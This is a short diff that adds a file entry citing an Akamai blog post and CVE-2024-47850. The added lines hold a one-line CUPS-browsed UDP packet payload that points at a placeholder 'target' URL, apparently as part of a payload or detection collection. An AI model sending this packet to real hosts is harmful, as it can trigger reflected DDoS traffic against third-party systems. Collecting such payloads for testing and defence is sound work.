@@ -1,0 +1,4 @@
+https://www.akamai.com/blog/security-research/october-cups-ddos-threat
+CVE-2024-47850
+CUPS-Browsed UDP Packet
+0 3 http://target:80/printers/X "0" "0"
